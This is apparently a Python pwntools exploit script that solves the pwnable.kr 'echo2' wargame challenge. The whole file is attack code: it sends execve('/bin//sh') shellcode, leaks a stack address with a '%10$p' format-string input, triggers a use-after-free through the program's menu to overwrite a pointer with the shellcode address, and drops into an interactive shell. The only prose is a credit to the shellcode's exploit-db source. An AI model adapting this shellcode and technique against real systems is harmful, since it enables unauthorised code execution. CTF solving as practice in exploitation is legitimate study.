#!/usr/bin/python
# -*- coding: utf-8 -*-
# shellcode: https://www.exploit-db.com/exploits/36858/
# @arthurpaixao

from pwn import *
shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
shellcode += "\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
leak = '%10$p'

# sh=process("/home/c/ctf/echo2")

sh = remote('pwnable.kr', 9011)
sh.recvuntil(':')
sh.sendline(shellcode)
print sh.recvuntil('> ')
sh.sendline('2')
sh.recvline()
sh.sendline(leak)
addr = sh.recvline().strip()
assert addr.startswith('0x')
name = int(addr, 16) - 0x20
sh.recvuntil('>')
sh.sendline('4')
sh.sendline('n')
sh.recvuntil('>')
sh.sendline('3')
sh.recvline()
sh.sendline('A' * 24 + p64(name))
sh.interactive()	
